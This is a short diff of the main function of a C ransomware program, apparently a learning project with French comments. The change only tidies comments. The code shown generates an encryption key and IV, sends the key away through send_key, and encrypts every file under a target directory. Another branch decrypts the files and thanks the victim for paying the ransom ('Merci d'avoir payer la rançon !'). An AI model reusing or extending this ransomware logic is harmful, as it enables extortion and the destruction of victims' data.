@@ -276,10 +276,7 @@ int main (int argc, char * argv[])
 		generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
 		send_key(pKey, pIv);
 		listdir(argv[1], iv, key, 'e',&nb_encrpt_file);
-		// vlc();
-		
-		// free((char *)pKey);
-		// free((char *)pIv);
+
 		memset(pKey, '\0', sizeKey);
 		memset(pIv, '\0', sizeIv);
 		printf("--------------------------------------\n");
@@ -293,8 +290,8 @@ int main (int argc, char * argv[])
 		listdir(argv[1], iv, key, 'd',&nb_encrpt_file);
 		printf("Merci d'avoir payer la rançon !");
 		
-		memset(key, '\0', sizeKey); //A vérifier si c'est bon
-		memset(iv, '\0', sizeIv); //A vérifier si c'est bon
+		memset(key, '\0', sizeKey); 
+		memset(iv, '\0', sizeIv);
 	}
 	
 	if(strcmp(argv[1], "--help")==0 & argc==2)
